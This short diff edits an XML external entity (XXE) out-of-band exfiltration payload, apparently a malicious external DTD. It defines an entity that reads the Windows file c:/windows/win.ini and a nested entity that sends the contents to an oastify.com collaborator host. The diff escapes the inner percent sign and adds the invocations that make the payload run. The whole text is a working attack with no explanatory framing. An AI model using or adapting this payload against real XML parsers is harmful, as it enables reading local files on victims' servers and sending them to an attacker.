@@ -1,3 +1,4 @@
-<?xml version="1.0" encoding="utf-8" ?>
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % bravo "<!ENTITY % charlie SYSTEM 'c2f55ckbjim9e1l1v2dgw5jcx33wrl.oastify.com/?%data;'>">
+<!ENTITY % bravo "<!ENTITY &#x25; charlie SYSTEM 'c2f55ckbjim9e1l1v2dgw5jcx33wrl.oastify.com/?%data;'>">
+%bravo;
+%charlie;
